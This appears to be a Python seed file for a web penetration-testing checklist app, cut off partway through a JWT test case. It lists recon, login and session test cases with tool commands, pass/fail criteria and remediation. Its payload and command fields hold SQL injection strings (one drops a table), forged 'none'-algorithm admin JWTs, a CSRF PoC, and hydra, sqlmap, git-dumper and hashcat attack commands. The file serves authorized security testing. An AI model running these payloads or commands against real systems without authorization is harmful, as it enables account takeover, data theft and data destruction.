"""Seed database: categories, test cases, and default admin user."""
import asyncio
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from sqlalchemy import select, text
from app.core.database import engine, Base, AsyncSessionLocal
from app.models.user import User
from app.models.organization import Organization
from app.models.category import Category
from app.models.test_case import TestCase
from app.core.security import hash_password

CATEGORIES = [
    ("recon", "🔍 Reconnaissance & URL Analysis", "recon", "🔍", 1),
    ("pre_auth", "🚪 Pre-Authentication Testing", "pre_auth", "🚪", 2),
    ("auth", "🔑 Authentication Testing", "auth", "🔑", 3),
    ("post_auth", "🏠 Post-Authentication Testing", "post_auth", "🏠", 4),
    ("business", "🧠 Business Logic Testing", "business", "🧠", 5),
    ("api", "⚡ API & Web Services Testing", "api", "⚡", 6),
    ("client", "🖥️ Client-Side Testing", "client", "🖥️", 7),
    ("transport", "🔒 Transport & Cryptography", "transport", "🔒", 8),
    ("infra", "🏗️ Infrastructure & Configuration", "infra", "🏗️", 9),
    ("tools", "🤖 Automated Tool Integration", "tools", "🤖", 10),
]

# Full test case library keyed by (phase, module_id)
TEST_CASES = [
    # ======================= RECON =======================
    {
        "module_id": "MOD-RECON-01", "phase": "recon", "severity": "info",
        "title": "Technology Fingerprinting",
        "description": "Identify frontend/backend technologies, frameworks, and version numbers exposed by the application.",
        "owasp_ref": "A05:2021", "cwe_id": "CWE-200",
        "where_to_test": "Browser → Wappalyzer extension / Response Headers / HTTP response bodies",
        "what_to_test": "Framework names, version numbers, server type, OS hints in headers or HTML comments",
        "how_to_test": "1. Install Wappalyzer extension and browse to the target URL\n2. Open Burp Suite → Browse target → Check response headers: Server, X-Powered-By, X-AspNet-Version, X-Generator\n3. Check HTML source for generator meta tags, framework-specific HTML structures\n4. Run: whatweb https://TARGET -a 3",
        "payloads": [],
        "tool_commands": [
            {"tool": "WhatWeb", "command": "whatweb https://TARGET -a 3 -v", "description": "Aggressive technology fingerprinting"},
            {"tool": "Wappalyzer", "command": "Browser Extension → Browse to target → View detected technologies", "description": "Visual tech stack detection"},
            {"tool": "curl", "command": "curl -I https://TARGET 2>&1 | grep -iE 'server|x-powered|x-generator|via'", "description": "Check response headers"}
        ],
        "pass_indicators": "No sensitive version information disclosed. Generic or missing X-Powered-By headers.",
        "fail_indicators": "Exact framework versions, server OS, or debug information exposed in headers or HTML",
        "remediation": "Remove X-Powered-By, Server version headers. Suppress framework identifiers in responses.",
        "tags": ["recon", "fingerprinting", "headers", "information-disclosure"],
        "references": [{"title": "OWASP Testing: Fingerprint Web Server", "url": "https://owasp.org/www-project-web-security-testing-guide/"}],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-RECON-02", "phase": "recon", "severity": "medium",
        "title": "robots.txt & sitemap.xml Analysis",
        "description": "Analyze robots.txt and sitemap.xml for sensitive paths, hidden admin panels, and directory structures.",
        "owasp_ref": "A05:2021", "cwe_id": "CWE-200",
        "where_to_test": "https://TARGET/robots.txt and https://TARGET/sitemap.xml",
        "what_to_test": "Disallowed paths, sensitive directories, admin panels, backup locations, all indexed URLs",
        "how_to_test": "1. Browse to https://TARGET/robots.txt → document all Disallow entries\n2. Browse to https://TARGET/sitemap.xml → map all pages\n3. Try accessing Disallow paths to verify restriction\n4. Cross-reference with directory busting results",
        "payloads": [],
        "tool_commands": [
            {"tool": "curl", "command": "curl https://TARGET/robots.txt; curl https://TARGET/sitemap.xml", "description": "Read robots.txt and sitemap"},
            {"tool": "gospider", "command": "gospider -s https://TARGET -o output --depth 3", "description": "Crawl sitemap and find all paths"}
        ],
        "pass_indicators": "robots.txt only lists public pages. No sensitive admin paths disclosed.",
        "fail_indicators": "Admin panels, backup files, config paths visible in robots.txt or sitemap",
        "remediation": "Do not include sensitive paths in robots.txt — security through obscurity is not sufficient but avoid mapping sensitive areas.",
        "tags": ["recon", "robots", "sitemap", "information-disclosure"],
        "references": [],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-RECON-03", "phase": "recon", "severity": "high",
        "title": "Directory & File Discovery (Fuzzing)",
        "description": "Discover hidden directories, files, backup files, and admin panels using wordlist-based fuzzing.",
        "owasp_ref": "A05:2021", "cwe_id": "CWE-538",
        "where_to_test": "Root URL and all discovered directories",
        "what_to_test": "Hidden admin panels, backup files (.bak, .old, .zip), config files (.env, .git), debug endpoints, API docs",
        "how_to_test": "1. Run ffuf with SecLists wordlist\n2. Run gobuster for directory enumeration\n3. Check for common sensitive files\n4. Look for .git exposed, .env files, backup archives",
        "payloads": ["/.env", "/.git/", "/backup.zip", "/backup.tar.gz", "/phpinfo.php", "/server-status", "/actuator", "/.DS_Store", "/web.config", "/wp-config.php"],
        "tool_commands": [
            {"tool": "ffuf", "command": "ffuf -w /opt/navigator/data/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://TARGET/FUZZ -mc 200,301,302,403 -o ffuf_results.json", "description": "Directory busting with medium wordlist"},
            {"tool": "ffuf", "command": "ffuf -w /opt/navigator/data/SecLists/Discovery/Web-Content/raft-medium-files.txt -u https://TARGET/FUZZ -e .php,.asp,.aspx,.jsp,.bak,.old,.config,.env -mc 200", "description": "File extension fuzzing"},
            {"tool": "gobuster", "command": "gobuster dir -u https://TARGET -w /opt/navigator/data/SecLists/Discovery/Web-Content/common.txt -x php,html,js,txt,config,bak -o gobuster.txt", "description": "Gobuster directory scan"},
            {"tool": "feroxbuster", "command": "feroxbuster --url https://TARGET --wordlist /opt/navigator/data/SecLists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt", "description": "Recursive directory search"}
        ],
        "pass_indicators": "No sensitive files or admin directories accessible. 403/404 for all backup/config paths.",
        "fail_indicators": ".env, .git, backup files, admin panels accessible without authentication",
        "remediation": "Remove debug/backup files from production. Implement proper access controls on admin directories.",
        "tags": ["recon", "directory-busting", "fuzzing", "ffuf", "gobuster"],
        "references": [{"title": "SecLists Discovery", "url": "https://github.com/danielmiessler/SecLists/tree/master/Discovery"}],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-RECON-04", "phase": "recon", "severity": "high",
        "title": "Git Repository Exposure",
        "description": "Check if .git directory is accessible, allowing source code and credentials download.",
        "owasp_ref": "A05:2021", "cwe_id": "CWE-538",
        "where_to_test": "https://TARGET/.git/",
        "what_to_test": "Accessible .git directory, HEAD file, config file, commit objects",
        "how_to_test": "1. Browse to https://TARGET/.git/HEAD\n2. If response is 'ref: refs/heads/main' → VULNERABLE\n3. Run git-dumper to download entire repo\n4. Scan downloaded code for hardcoded secrets, passwords, API keys",
        "payloads": ["/.git/HEAD", "/.git/config", "/.git/COMMIT_EDITMSG", "/.git/index"],
        "tool_commands": [
            {"tool": "curl", "command": "curl -s https://TARGET/.git/HEAD", "description": "Check if .git is accessible"},
            {"tool": "git-dumper", "command": "git-dumper https://TARGET/.git output_dir/", "description": "Download exposed git repository"},
            {"tool": "trufflehog", "command": "trufflehog filesystem output_dir/ --json", "description": "Scan for secrets in downloaded code"}
        ],
        "pass_indicators": "403 Forbidden or 404 returned for /.git/ directory",
        "fail_indicators": "200 OK for /.git/HEAD, .git directory contents readable, source code downloadable",
        "remediation": "Block web access to .git directory via Nginx/Apache config. Never deploy .git to production web root.",
        "tags": ["recon", "git", "source-code", "secrets"],
        "references": [{"title": "PayloadsAllTheThings - Insecure SCM", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure Source Code Management"}],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-RECON-05", "phase": "recon", "severity": "high",
        "title": "Nuclei Automated Scanning",
        "description": "Run Nuclei template-based scanner to detect CVEs, misconfigurations, exposures, and common vulnerabilities.",
        "owasp_ref": "A06:2021", "cwe_id": "CWE-1032",
        "where_to_test": "Full application URL",
        "what_to_test": "CVEs, misconfigurations, exposed panels, SSL issues, outdated components",
        "how_to_test": "1. Install nuclei and update templates\n2. Run full scan\n3. Review results for critical/high severity issues\n4. Manually verify each finding",
        "payloads": [],
        "tool_commands": [
            {"tool": "nuclei", "command": "nuclei -u https://TARGET -t ~/nuclei-templates/ -severity critical,high,medium -o nuclei_results.txt", "description": "Full Nuclei scan"},
            {"tool": "nuclei", "command": "nuclei -u https://TARGET -tags ssl,headers,misconfig,exposure,xss,sqli -o nuclei_tagged.txt", "description": "Tag-specific Nuclei scan"},
            {"tool": "nuclei", "command": "nuclei -u https://TARGET -t technologies/ -t exposures/ -o nuclei_tech.txt", "description": "Technology and exposure detection"}
        ],
        "pass_indicators": "No critical or high severity issues found. Application templates return no hits.",
        "fail_indicators": "CVEs detected, exposed admin panels, default credentials, misconfigurations found",
        "remediation": "Patch identified CVEs. Update dependencies. Fix misconfigurations per Nuclei findings.",
        "tags": ["recon", "nuclei", "automated", "cve-scanning"],
        "references": [{"title": "ProjectDiscovery Nuclei", "url": "https://github.com/projectdiscovery/nuclei"}],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-RECON-06", "phase": "recon", "severity": "medium",
        "title": "JavaScript Library Vulnerability Scan (RetireJS)",
        "description": "Identify vulnerable JavaScript libraries with known CVEs.",
        "owasp_ref": "A06:2021", "cwe_id": "CWE-1035",
        "where_to_test": "All JavaScript files loaded by the application",
        "what_to_test": "Outdated jQuery, Angular, Bootstrap, lodash, moment.js, underscore with known vulnerabilities",
        "how_to_test": "1. Install RetireJS browser extension\n2. Browse to target and check results\n3. Use CLI version for comprehensive scan\n4. Look for: jQuery < 3.5.0 (XSS), Angular < 1.6 (XSS), Bootstrap < 3.4.1 (XSS)",
        "payloads": [],
        "tool_commands": [
            {"tool": "retire.js", "command": "retire --url https://TARGET --outputformat json --outputpath retire_results.json", "description": "RetireJS CLI scan"},
            {"tool": "snyk", "command": "snyk test --json > snyk_results.json", "description": "Snyk dependency vulnerability check"}
        ],
        "pass_indicators": "All JavaScript libraries are up-to-date with no known CVEs.",
        "fail_indicators": "Vulnerable jQuery, Angular, Bootstrap, lodash versions detected",
        "remediation": "Update all JavaScript libraries to latest patched versions. Implement SRI (Subresource Integrity) for CDN resources.",
        "tags": ["recon", "retirejs", "javascript", "dependencies", "cve"],
        "references": [],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-RECON-07", "phase": "recon", "severity": "medium",
        "title": "SSL/TLS Configuration Analysis",
        "description": "Comprehensive SSL/TLS security assessment including protocol versions, cipher suites, and certificate validity.",
        "owasp_ref": "A02:2021", "cwe_id": "CWE-326",
        "where_to_test": "HTTPS endpoint of the target application",
        "what_to_test": "TLS versions (SSLv2/3, TLS 1.0/1.1 should be disabled), weak cipher suites, certificate validity, HSTS, POODLE, BEAST, ROBOT, Heartbleed",
        "how_to_test": "1. Run testssl.sh full scan\n2. Check for SSLv2, SSLv3, TLS 1.0/1.1 support\n3. Look for RC4, DES, 3DES, EXPORT ciphers\n4. Verify HSTS header with includeSubDomains\n5. Check certificate chain completeness",
        "payloads": [],
        "tool_commands": [
            {"tool": "testssl.sh", "command": "testssl.sh --full https://TARGET", "description": "Comprehensive SSL/TLS audit"},
            {"tool": "testssl.sh", "command": "testssl.sh --protocols https://TARGET", "description": "Check supported TLS protocols"},
            {"tool": "testssl.sh", "command": "testssl.sh --heartbleed --poodle --robot https://TARGET", "description": "Check for specific SSL vulnerabilities"},
            {"tool": "nmap", "command": "nmap --script ssl-enum-ciphers -p 443 TARGET", "description": "Enumerate supported cipher suites"}
        ],
        "pass_indicators": "TLS 1.2+ only, strong cipher suites, valid certificate chain, HSTS enabled, no known SSL vulnerabilities",
        "fail_indicators": "SSLv3/TLS 1.0 supported, weak ciphers (RC4, DES), expired/self-signed cert, no HSTS",
        "remediation": "Disable SSLv2/3, TLS 1.0/1.1. Use strong cipher suites only. Enable HSTS with includeSubDomains. Ensure valid certificate chain.",
        "tags": ["transport", "ssl", "tls", "certificate", "hsts"],
        "references": [{"title": "OWASP TLS Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/TLS_Cipher_String_Cheat_Sheet.html"}],
        "applicability_conditions": {}
    },
    # ======================= PRE-AUTH =======================
    {
        "module_id": "MOD-01", "phase": "pre_auth", "severity": "medium",
        "title": "Login Page - Source Code & Sensitive Data Inspection",
        "description": "Inspect the login page source code, JavaScript files, and network requests for hardcoded secrets, sensitive data, and information disclosure.",
        "owasp_ref": "A02:2021", "cwe_id": "CWE-312",
        "where_to_test": "Browser DevTools → Elements, Sources, Network, Console, Application tabs on login page",
        "what_to_test": "Hardcoded passwords/API keys in JS, hidden form fields with sensitive data, network request leakage, localStorage/sessionStorage data, console errors revealing server info",
        "how_to_test": "1. F12 → Sources → Search for: password, secret, api_key, token, config, credential\n2. F12 → Elements → Inspect form for hidden input fields\n3. F12 → Network → Clear → Load page → Check ALL requests\n4. F12 → Console → Note errors revealing server info\n5. F12 → Application → LocalStorage/SessionStorage → Check for pre-auth data\n6. F12 → Application → Cookies → Check flags: HttpOnly, Secure, SameSite",
        "payloads": [],
        "tool_commands": [
            {"tool": "Burp Suite", "command": "Proxy → Intercept → Browse login page → Check all requests and responses for sensitive data", "description": "Intercept and analyze all traffic"},
            {"tool": "grep", "command": "grep -rn 'password\\|api_key\\|secret\\|token' /downloaded_js_files/", "description": "Search downloaded JS for secrets"},
            {"tool": "LinkFinder", "command": "python linkfinder.py -i https://TARGET -d -o cli", "description": "Extract hidden endpoints from JS files"}
        ],
        "pass_indicators": "No sensitive data in JS source, no hidden fields with server-side IDs, proper HttpOnly/Secure cookie flags set",
        "fail_indicators": "Hardcoded credentials or API keys in JS, sensitive data in hidden fields, sensitive data in localStorage, cookies missing security flags",
        "remediation": "Never hardcode credentials. Set HttpOnly, Secure, SameSite=Strict on all cookies. Use server-side rendered secrets only.",
        "tags": ["pre-auth", "source-code", "information-disclosure", "cookies"],
        "references": [],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-06", "phase": "pre_auth", "severity": "medium",
        "title": "Username Enumeration",
        "description": "Test whether the application reveals valid usernames through differential responses on login, forgot password, or registration flows.",
        "owasp_ref": "A07:2021", "cwe_id": "CWE-204",
        "where_to_test": "Login page, Forgot Password page, Registration page",
        "what_to_test": "Different error messages for valid vs invalid username, timing differences, HTTP response code differences",
        "how_to_test": "1. Try login with valid username + wrong password → note exact response message and response time\n2. Try login with invalid username + wrong password → compare message and timing\n3. If messages differ (e.g., 'wrong password' vs 'user not found') → VULNERABLE\n4. Use Burp Intruder with username wordlist to automate\n5. Check forgot password: 'email sent' vs 'email not found'",
        "payloads": ["admin", "test", "administrator", "user", "root", "guest"],
        "tool_commands": [
            {"tool": "Burp Suite", "command": "Send login request to Intruder → Position on username → Load SecLists/Usernames/Names/names.txt → Attack → Sort by response length", "description": "Username enumeration via Intruder"},
            {"tool": "ffuf", "command": "ffuf -w /opt/navigator/data/SecLists/Usernames/Names/names.txt -u https://TARGET/login -X POST -d 'username=FUZZ&password=test' -H 'Content-Type: application/x-www-form-urlencoded' -fr 'Invalid credentials'", "description": "Username fuzzing to enumerate valid users"}
        ],
        "pass_indicators": "Identical error messages for valid/invalid usernames. No timing differences.",
        "fail_indicators": "Different messages for valid vs invalid users. Timing attacks possible. Forgot password confirms email existence.",
        "remediation": "Use generic error messages: 'Invalid username or password'. Add artificial timing delay to prevent timing attacks.",
        "tags": ["pre-auth", "username-enumeration", "information-disclosure"],
        "references": [],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-30", "phase": "pre_auth", "severity": "high",
        "title": "Brute Force Attack & Account Lockout",
        "description": "Test for lack of account lockout, rate limiting, and CAPTCHA on authentication endpoints.",
        "owasp_ref": "A07:2021", "cwe_id": "CWE-307",
        "where_to_test": "Login form, forgot password, OTP fields",
        "what_to_test": "Account lockout after N failed attempts, IP-based rate limiting, CAPTCHA enforcement, progressive delay implementation",
        "how_to_test": "1. Attempt 10+ wrong password logins → check if account locks\n2. Use Burp Intruder with common passwords wordlist\n3. Check response time increases (progressive delay)\n4. Test from different IPs to bypass IP-based lockout\n5. Check if lockout can be bypassed by changing X-Forwarded-For header",
        "payloads": ["admin", "password", "123456", "password123", "admin123", "qwerty"],
        "tool_commands": [
            {"tool": "Burp Intruder", "command": "Capture login → Send to Intruder → Set § around password → Load /opt/navigator/data/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt → Attack Type: Sniper", "description": "Brute force with common passwords"},
            {"tool": "hydra", "command": "hydra -l admin -P /opt/navigator/data/SecLists/Passwords/Common-Credentials/best110.txt https://TARGET http-post-form '/login:username=^USER^&password=^PASS^:Invalid'", "description": "Hydra HTTP brute force"}
        ],
        "pass_indicators": "Account locks after 5 attempts. IP rate limiting enforced. CAPTCHA appears after failures.",
        "fail_indicators": "No lockout. Unlimited login attempts allowed. No rate limiting or CAPTCHA.",
        "remediation": "Implement account lockout after 5 failures. Add progressive delays. Enforce CAPTCHA after 3 failures. Implement IP-based rate limiting.",
        "tags": ["pre-auth", "brute-force", "rate-limiting", "account-lockout"],
        "references": [{"title": "SecLists Passwords", "url": "https://github.com/danielmiessler/SecLists/tree/master/Passwords"}],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-36-PRE", "phase": "pre_auth", "severity": "critical",
        "title": "SQL Injection on Login Form",
        "description": "Test login form for SQL injection vulnerabilities that could bypass authentication.",
        "owasp_ref": "A03:2021", "cwe_id": "CWE-89",
        "where_to_test": "Username and password fields on login form",
        "what_to_test": "Authentication bypass via SQL injection in username/password parameters",
        "how_to_test": "1. Enter SQL payloads in username field\n2. Observe responses for SQL errors or successful login bypass\n3. Test boolean-based and time-based SQLi\n4. Use SQLMap on login form",
        "payloads": [
            "admin'--", "admin' or 1=1--", "' OR '1'='1", "' OR '1'='1'--", "admin'/*",
            "' OR 1=1--", "') OR ('1'='1", "admin'; DROP TABLE users--",
            "' UNION SELECT null,null--", "1' AND '1'='1"
        ],
        "tool_commands": [
            {"tool": "sqlmap", "command": "sqlmap -u 'https://TARGET/login' --data='username=admin&password=test' --level=5 --risk=3 --dbs --batch", "description": "SQLMap on login POST form"},
            {"tool": "sqlmap", "command": "sqlmap -u 'https://TARGET/login' --data='username=admin&password=test' --dbms=mysql --technique=BT --batch", "description": "Time and boolean-based SQLi on login"}
        ],
        "pass_indicators": "SQL errors handled gracefully. Parameterized queries prevent injection. Login fails with payloads.",
        "fail_indicators": "Authentication bypassed with SQL payload. SQL error messages visible. Database data dumped.",
        "remediation": "Use parameterized queries or ORM. Never concatenate user input in SQL strings. Implement WAF.",
        "tags": ["sqli", "authentication-bypass", "pre-auth", "critical"],
        "references": [{"title": "PayloadsAllTheThings - SQL Injection", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL Injection"}],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-02", "phase": "pre_auth", "severity": "medium",
        "title": "Forgot Password Security",
        "description": "Test forgot password flow for account enumeration, weak reset tokens, token reuse, and expiry issues.",
        "owasp_ref": "A07:2021", "cwe_id": "CWE-640",
        "where_to_test": "Forgot password page and email reset links",
        "what_to_test": "Reset token entropy, token expiry (should be ≤1 hour), token reuse (should fail), account enumeration through response differences",
        "how_to_test": "1. Submit forgot password for non-existent email → note response (should be generic)\n2. Get reset link → Use it → Use same link again → Should be expired\n3. Get reset link → Wait 2+ hours → Try using → Should be expired\n4. Analyze reset token for predictability (check entropy, sequential patterns)\n5. Test if reset token can be used for another account",
        "payloads": [],
        "tool_commands": [
            {"tool": "Burp Suite", "command": "Intercept forgot password request → Send to Repeater → Test same reset token twice", "description": "Test reset token single-use enforcement"},
            {"tool": "hashcat", "command": "hashcat -a 0 -m 0 [RESET_TOKEN_HASH] /opt/navigator/data/SecLists/Passwords/Leaked-Databases/rockyou.txt", "description": "Crack weak reset tokens"}
        ],
        "pass_indicators": "Generic response for unknown emails. Reset token expires after 1 hour. Token is single-use. High entropy tokens.",
        "fail_indicators": "Different response for valid/invalid emails. Token reuse allowed. Predictable tokens. No expiry.",
        "remediation": "Use cryptographically random tokens (min 128 bits). Expire after 1 hour. Single-use tokens. Generic error messages.",
        "tags": ["pre-auth", "forgot-password", "token", "enumeration"],
        "references": [],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-05", "phase": "pre_auth", "severity": "low",
        "title": "Autocomplete on Sensitive Fields",
        "description": "Check if autocomplete is disabled on sensitive form fields like passwords and PINs.",
        "owasp_ref": "A02:2021", "cwe_id": "CWE-525",
        "where_to_test": "Login form, registration form, password reset form",
        "what_to_test": "autocomplete attribute on password, credit card, and sensitive input fields",
        "how_to_test": "1. Right-click on password field → Inspect Element\n2. Check for autocomplete='off' or autocomplete='new-password'\n3. Missing attribute is a finding",
        "payloads": [],
        "tool_commands": [
            {"tool": "Browser DevTools", "command": "F12 → Elements → Search for 'input type=password' → Check autocomplete attribute", "description": "Inspect autocomplete attribute"},
            {"tool": "curl", "command": "curl -s https://TARGET/login | grep -i 'autocomplete'", "description": "Check page source for autocomplete"}
        ],
        "pass_indicators": "autocomplete='off' or autocomplete='new-password' on sensitive fields",
        "fail_indicators": "Missing autocomplete='off' on password, credit card, and sensitive fields",
        "remediation": "Add autocomplete='off' to password and sensitive form fields.",
        "tags": ["pre-auth", "autocomplete", "information-disclosure"],
        "references": [],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-33", "phase": "pre_auth", "severity": "medium",
        "title": "CAPTCHA Implementation Testing",
        "description": "Test CAPTCHA for bypass techniques including removal, replay, OCR bypass, and audio bypass.",
        "owasp_ref": "A07:2021", "cwe_id": "CWE-307",
        "where_to_test": "Login, registration, forgot password, any form with CAPTCHA",
        "what_to_test": "CAPTCHA removal, token replay, server-side validation absence, audio CAPTCHA bypass",
        "how_to_test": "1. Submit form without CAPTCHA parameter → If success: VULNERABLE\n2. Remove CAPTCHA value → Submit → Check if accepted\n3. Solve CAPTCHA once → Replay same CAPTCHA token multiple times\n4. Use empty CAPTCHA value\n5. Use any string as CAPTCHA value",
        "payloads": ["", "null", "undefined", "bypass", "000000"],
        "tool_commands": [
            {"tool": "Burp Suite", "command": "Intercept form submission → Remove captcha parameter → Forward → Check if form submits", "description": "Remove CAPTCHA parameter"},
            {"tool": "Burp Suite", "command": "Solve CAPTCHA once → Copy token → Burp Intruder → Use same token in all requests", "description": "CAPTCHA token replay test"}
        ],
        "pass_indicators": "CAPTCHA server-side validated. Token single-use. Removal causes rejection.",
        "fail_indicators": "Form submits without CAPTCHA. CAPTCHA token reusable. Only client-side validation.",
        "remediation": "Implement server-side CAPTCHA validation. Use single-use CAPTCHA tokens. Consider reCAPTCHA v3.",
        "tags": ["pre-auth", "captcha", "bypass", "brute-force"],
        "references": [],
        "applicability_conditions": {"requires_any": ["features:captcha"]}
    },
    {
        "module_id": "MOD-PRE-CSRF", "phase": "pre_auth", "severity": "medium",
        "title": "CSRF on Login Form",
        "description": "Test for Cross-Site Request Forgery on the login form which can lead to login CSRF attacks.",
        "owasp_ref": "A01:2021", "cwe_id": "CWE-352",
        "where_to_test": "Login form",
        "what_to_test": "CSRF token presence and validation, SameSite cookie attribute",
        "how_to_test": "1. Burp Suite → Right-click login request → Engagement Tools → Generate CSRF PoC\n2. Open PoC on different domain\n3. Check if login completes → Login CSRF possible\n4. Check for CSRF token in form\n5. Check cookie SameSite attribute",
        "payloads": ['<html><body><form action="https://TARGET/login" method="POST"><input type="hidden" name="username" value="attacker"><input type="submit"></form></body></html>'],
        "tool_commands": [
            {"tool": "Burp Suite", "command": "Capture login POST → Right-click → Engagement Tools → Generate CSRF PoC → Test", "description": "Generate CSRF PoC for login"}
        ],
        "pass_indicators": "CSRF token present and validated. SameSite=Strict or Lax cookies.",
        "fail_indicators": "No CSRF token on login. Form submits from external domain.",
        "remediation": "Add CSRF tokens to login form. Set SameSite=Strict on session cookies.",
        "tags": ["pre-auth", "csrf", "login"],
        "references": [{"title": "PayloadsAllTheThings - CSRF", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Cross-Site Request Forgery"}],
        "applicability_conditions": {}
    },
    # ======================= AUTH =======================
    {
        "module_id": "MOD-11-SESSION", "phase": "auth", "severity": "high",
        "title": "Session Token Security Analysis",
        "description": "Analyze session token entropy, predictability, and security using Burp Sequencer.",
        "owasp_ref": "A07:2021", "cwe_id": "CWE-330",
        "where_to_test": "Session cookie after login",
        "what_to_test": "Session token entropy (should be ≥128 bits), predictability, sequential tokens, algorithmic weaknesses",
        "how_to_test": "1. Login 5+ times → Collect all session tokens\n2. Burp Suite → Proxy → Right-click session response → Send to Sequencer\n3. Live Capture → Start → Collect 200+ tokens → Analyze\n4. Check FIPS level of token entropy\n5. Look for patterns in tokens (timestamps, user IDs embedded)",
        "payloads": [],
        "tool_commands": [
            {"tool": "Burp Sequencer", "command": "Proxy → Intercept Login → Response → Right-click Set-Cookie header → Send to Sequencer → Live Capture → Analyze", "description": "Analyze session token entropy"},
            {"tool": "python", "command": "python3 -c \"import base64,sys; t=sys.argv[1]; print(base64.b64decode(t+'=='))\" SESSION_TOKEN", "description": "Decode and inspect session token structure"}
        ],
        "pass_indicators": "High entropy tokens (FIPS excellent). No predictable patterns. Tokens regenerated on each login.",
        "fail_indicators": "Low entropy or predictable tokens. Sequential IDs. Timestamps embedded. Tokens not regenerated after login.",
        "remediation": "Use cryptographically secure random session tokens (min 128 bits). Use framework-provided session management.",
        "tags": ["auth", "session", "entropy", "sequencer"],
        "references": [],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-11-FIXATION", "phase": "auth", "severity": "high",
        "title": "Session Fixation",
        "description": "Test if the application regenerates session token after login to prevent session fixation attacks.",
        "owasp_ref": "A07:2021", "cwe_id": "CWE-384",
        "where_to_test": "Login flow, session token in cookies and URL parameters",
        "what_to_test": "Session ID regeneration on login, session ID in URLs, pre-authentication session reuse",
        "how_to_test": "1. Before login: note the pre-auth session token\n2. After login: compare session token → Should be completely different\n3. Check if session ID appears in URL (JSESSIONID, PHPSESSID in query string)\n4. Set a known session ID before login → After login check if same ID still valid",
        "payloads": [],
        "tool_commands": [
            {"tool": "Burp Suite", "command": "GET /login → Note Set-Cookie session_id → Login → Compare new session_id in response", "description": "Check session regeneration"},
            {"tool": "curl", "command": "curl -c /tmp/cookies.txt https://TARGET/login; cat /tmp/cookies.txt", "description": "Check session cookie before/after login"}
        ],
        "pass_indicators": "Session token completely changes after successful login. No session ID in URLs.",
        "fail_indicators": "Same session token before and after login. Session ID in URL parameters.",
        "remediation": "Always regenerate session token on login. Never place session IDs in URLs.",
        "tags": ["auth", "session-fixation", "session-management"],
        "references": [],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-11-TIMEOUT", "phase": "auth", "severity": "medium",
        "title": "Session Timeout & Logout Testing",
        "description": "Test session expiry after inactivity, proper session invalidation on logout, and browser back button attack.",
        "owasp_ref": "A07:2021", "cwe_id": "CWE-613",
        "where_to_test": "Authenticated session, logout functionality",
        "what_to_test": "Idle session timeout (should be ≤30 min), absolute session timeout (≤8 hours), server-side session invalidation on logout, browser back button",
        "how_to_test": "1. Login → Idle for 30 minutes → Try action → Session should expire\n2. Login → Click Logout → Press browser Back → Should NOT show auth page\n3. Login → Copy authenticated URL → Open in incognito → Should redirect to login\n4. Login → Logout → Replay old session token in Burp → Should return 401/403",
        "payloads": [],
        "tool_commands": [
            {"tool": "Burp Suite", "command": "Login → Copy session token → Logout → Replay GET /dashboard with old session token in Repeater", "description": "Test session invalidation on logout"}
        ],
        "pass_indicators": "Session invalidated on logout. 401/403 returned for replayed old tokens. Idle timeout enforced.",
        "fail_indicators": "Old session token still valid after logout. No session timeout. Browser back shows auth page content.",
        "remediation": "Invalidate session server-side on logout. Implement 30-minute idle timeout. Use Cache-Control: no-store on auth pages.",
        "tags": ["auth", "session-timeout", "logout", "session-management"],
        "references": [],
        "applicability_conditions": {}
    },
    {
        "module_id": "MOD-JWT", "phase": "auth", "severity": "critical",
        "title": "JWT Token Attack Suite",
        "description": "Comprehensive JWT security testing including algorithm confusion, none algorithm, weak secrets, and header injection.",
        "owasp_ref": "A02:2021", "cwe_id": "CWE-347",
        "where_to_test": "Authorization header, cookies containing JWT tokens",
        "what_to_test": "Algorithm none attack, RS256→HS256 confusion, weak secret brute force, kid header injection, expired token bypass, role escalation",
        "how_to_test": "1. Decode JWT header/payload: base64 decode each part\n2. Algorithm None: Change alg to 'none', remove signature\n3. RS256→HS256: Get server public key → Re-sign with HS256 using public key as secret\n4. Brute force weak secret with hashcat\n5. Try changing role claim: 'user' → 'admin'\n6. Modify kid header to ../../dev/null",
        "payloads": [
            "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.SIGNATURE"
        ],
        "tool_commands": [
            {"tool": "jwt_tool", "command": "jwt_tool eyJ... -M at -t https://TARGET/api/user -rh 'Authorization: Bearer eyJ...' --exploit", "description": "Automated JWT attack suite"},
            {"tool": "jwt_tool", "command": "jwt_tool eyJ... -C -d /opt/navigator/data/SecLists/Passwords/Leaked-Databases/rockyou.txt", "description": "Crack JWT weak secret"},
            {"tool": "Burp JWT Editor", "command": "Install JWT Editor extension → Edit JWT in Burp → Try algorithm confusion, none attack", "description": "Burp JWT Editor attacks"},
            {"tool": "hashcat", "command": "hashcat -a 0 -m 16500 TOKEN.jwt /opt/navigator/data/SecLists/Passwords/Common-Credentials/best110.txt", "description": "JWT secret brute force with hashcat"}
        ],
        "pass_indicators": "Algorithm none rejected. RS256→HS256 confusion fails. Weak secrets not accepted. Role changes in payload rejected.",
        "fail_indicators": "Algorithm none bypass works. Weak secret cracked. Role escalation via payload modification. kid injection successful.",
